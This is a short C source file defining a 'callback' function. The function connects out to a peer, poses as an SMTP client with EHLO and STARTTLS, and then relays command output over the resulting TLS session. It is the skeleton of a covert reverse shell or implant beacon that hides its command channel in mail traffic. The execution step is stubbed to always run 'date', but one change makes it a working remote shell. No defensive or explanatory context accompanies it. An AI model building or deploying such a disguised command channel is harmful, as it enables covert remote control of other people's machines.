#include <openssl/ssl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int callback(struct sockaddr_in *peer) {
    char command[4096], output[4096];
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(fd, (struct sockaddr *)peer, sizeof(*peer))) return -1;
    recv(fd, output, sizeof(output), 0);
    send(fd, "EHLO edge\r\n", 11, 0);
    recv(fd, output, sizeof(output), 0);
    send(fd, "STARTTLS\r\n", 10, 0);
    recv(fd, output, sizeof(output), 0);
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL *tls = SSL_new(ctx);
    SSL_set_fd(tls, fd);
    if (SSL_connect(tls) != 1) return -1;
    int n;
    while ((n = SSL_read(tls, command, sizeof(command)-1)) > 0) {
        command[n] = 0;
        char local[] = "date";
        FILE *pipe = popen(local, "r");
        if (!pipe) break;
        while ((n = fread(output, 1, sizeof(output), pipe)) > 0)
            SSL_write(tls, output, n);
        pclose(pipe);
    }
    SSL_free(tls);
    SSL_CTX_free(ctx);
    close(fd);
    return 0;
}
